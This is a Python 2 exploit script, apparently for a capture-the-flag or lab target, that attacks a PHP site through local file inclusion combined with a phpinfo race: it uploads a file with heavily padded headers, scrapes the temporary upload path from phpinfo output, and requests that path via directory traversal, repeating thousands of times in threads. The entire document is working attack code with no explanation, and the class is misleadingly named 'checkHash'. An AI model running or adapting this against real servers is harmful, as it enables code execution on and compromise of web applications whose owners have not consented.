import sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re
from subprocess import Popen, PIPE, STDOUT

NumOfThreads=1
queue = Queue.Queue()

class checkHash(threading.Thread):
	def __init__(self,queue):
		threading.Thread.__init__(self)
		self.queue=queue
	def run(self):
		i=0
		while True:
			self.clear=self.queue.get()
			passtry = self.clear
			if passtry != "":

				padding="A" * 5000

				cookies = {
				    'PHPSESSID': 'o99quh47clk8br394298tkv5o0',
				    'othercookie': padding
				}

				headers = {
				    'User-Agent': padding,
				    'Pragma': padding,
				    'Accept': padding,
				    'Accept-Language': padding,
				    'DNT': '1'
				}

				files = {'arquivo': open('passwords.txt','rb')}

				reqs='http://cyberwar.jhy-sec.com/info.php?action=../../var/www/phpinfo/index.php&a='+padding
				#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&a='+padding
				response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=False)
				data = response.content
				data = re.search(r"(?<=tmp_name] =&gt; ).*", data).group(0)
				print data

				reqs = 'http://cyberwar.jhy-sec.com//info.php?action=../..'+data
				#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data
				print reqs
				response = requests.get(reqs, verify=False)
				data = response.content
				print data

			i+=1
			self.queue.task_done()

for i in range(NumOfThreads):
    t=checkHash(queue)
    t.setDaemon(True)
    t.start()

for x in range(0, 9999):
	x=str(x)
	queue.put(x.strip())

queue.join()